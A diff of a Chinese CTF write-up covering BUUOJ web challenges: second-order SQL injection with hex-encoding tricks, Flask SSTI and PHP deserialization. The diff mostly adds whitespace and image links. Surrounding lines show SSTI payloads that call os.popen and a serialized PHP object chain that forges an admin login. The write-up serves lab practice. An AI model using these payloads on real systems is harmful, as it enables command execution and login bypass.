@@ -12,8 +12,8 @@ author: 1_N
 打开是这样  
 
 
-
 ![01.png](https://img10.360buyimg.com/ddimg/jfs/t1/172299/33/6670/3057/6087c133E05eb4964/f7d5c0725165dfea.png)       
+
 
 
 
@@ -113,11 +113,23 @@ RC4加密脚本
 
 
 
+
+
 ![05.png](https://img13.360buyimg.com/ddimg/jfs/t1/166916/2/20756/717273/6087c89fEf400f1c8/5d5e711f5e5060ff.png)      
 
 
 
+
+
+
+
+
 ![04.png](https://img12.360buyimg.com/ddimg/jfs/t1/186127/13/1163/8759/6087c863E6220db00/67e1250969f3a7eb.png)        
+
+
+
+
+
 
 
 
@@ -131,9 +143,18 @@ RC4加密脚本
 [Rc4加密](https://blog.csdn.net/qq_41381461/article/details/100991617?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-3.control)
 
 ## Unfinish
+打开环境
+
+
 
 
 ![01.png](https://img11.360buyimg.com/ddimg/jfs/t1/181130/17/1544/29996/608ad77eE7e059785/fcb10cb3973eb937.png)      
+
+
+
+
+
+
 
 URL为：`http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php`     
 
@@ -141,13 +162,38 @@ URL为：`http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php`
 
 果然      
 
+
+
+
+
+
 ![02.png](https://img11.360buyimg.com/ddimg/jfs/t1/189730/22/621/29267/608ad7f4Eb2fe540a/175965ef798babd3.png)  
+
+
+
+
+
 
 
 随便注册个看看   
 
 
-![03.png](https://img11.360buyimg.com/ddimg/jfs/t1/194217/13/548/131720/608ad830E2605bd5a/3e109deab88c8cf1.png)      
+
+
+![03.png](https://img11.360buyimg.com/ddimg/jfs/t1/194217/13/548/131720/608ad830E2605bd5a/3e109deab88c8cf1.png)    
+
+
+
+
+
+
+
+
+
+
+
+
+  
 可以看到在侧边栏这里显示了我们的用户名          
 
 二次注入       
@@ -160,7 +206,10 @@ URL为：`http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php`
 之所以要两次hex编码是因为，一次编码产生的结果里可能有字母，加0后就成了字母前面的纯数字      
 
 
+
 ![04.png](https://img11.360buyimg.com/ddimg/jfs/t1/186262/16/1480/306644/608ad9e5Eb3f7074c/bf9784e6e02681be.png)        
+
+
 
 
 数字过大转为了科学计数法       
@@ -168,7 +217,10 @@ URL为：`http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php`
 用substr,`,`被过，变为`from x for x`       
 
 
+
+
 ![05.png](https://img14.360buyimg.com/ddimg/jfs/t1/185436/35/1509/304850/608ada67E0214a5f5/8198055dc97e7fa4.png)        
+
 
 
 
@@ -218,12 +270,23 @@ URL为：`http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php`
 
 
 
+
+
 ![06.png](https://img13.360buyimg.com/ddimg/jfs/t1/175950/30/7065/148511/608adb94E422ae4f9/34785ddab5c3f6fc.png)
 
+
+
+
+
+
 ## I_<3_Flask
+打开环境
+
 
 
 ![01.png](https://img12.360buyimg.com/ddimg/jfs/t1/161519/39/21188/9767/6086ba66E2717eebd/6a88b62e64abede0.png)       
+
+
 
 
 题目是flask，应该是SSTI了吧       
@@ -234,19 +297,39 @@ URL为：`http://0394ab22-e370-4cca-91f6-05a8ac92ab21.node3.buuoj.cn/login.php`
 先下载，然后到arjun目录下
 
 
+
 ![02.png](https://img13.360buyimg.com/ddimg/jfs/t1/180871/9/1120/185944/6086bbb1E090ab472/52e2d85cb4d99503.png)       
+
+
 
 
 安装  
 
 
+
 ![03.png](https://img12.360buyimg.com/ddimg/jfs/t1/196052/31/68/531183/6086bbb4E1c038775/a9233572bd309699.png)        
+
+
+
+
+
 
 
 使用      
 
 
+
+
+
+
+
 ![04.png](https://img11.360buyimg.com/ddimg/jfs/t1/166728/7/20579/248205/6086bbb1E09bb265d/265b5c678e16dd73.png)        
+
+
+
+
+
+
 
 
 爆破出参数是name        
@@ -258,11 +341,35 @@ payload：`{{().__class__.__bases__[0].__subclasses__()[182].__init__.__globals_
 `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`     
 两个都行
 
+
+
+
+
+
 ![05.png](https://img12.360buyimg.com/ddimg/jfs/t1/189306/16/158/12638/6086bc79E75a9f880/16bb47b996587c46.png)
 
+
+
+
+
+
+
+
+
+
 ## Easyphp
+打开环境
+
+
+
+
+
 
 ![01.png](https://img12.360buyimg.com/ddimg/jfs/t1/186967/37/782/447665/608c1c8bE8f062515/dd33c81b065b285b.png)
+
+
+
+
 
 
 
@@ -586,7 +693,17 @@ payload：`{{().__class__.__bases__[0].__subclasses__()[182].__init__.__globals_
 
 c4ca4238a0b923820dcc509a6f75849b是1的MD5值      
 
+
+
+
+
 ![03.png](https://img12.360buyimg.com/ddimg/jfs/t1/192784/20/706/130842/608c3197Ec5588c09/d8bef464f63eb40a.png)
+
+
+
+
+
+
 
 
 这样再控制dbCtrl里的name和password就可以以admin登录       
@@ -685,7 +802,16 @@ c4ca4238a0b923820dcc509a6f75849b是1的MD5值
 
 payload:`";s:8:"CtrlCase";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}}}}`      
 
+
+
+
+
 ![02.png](https://img12.360buyimg.com/ddimg/jfs/t1/179326/17/1720/143813/608c2f0bEd5a3e0ed/156a14c371a68116.png)
+
+
+
+
+
 
 可以看到长度为263       
 
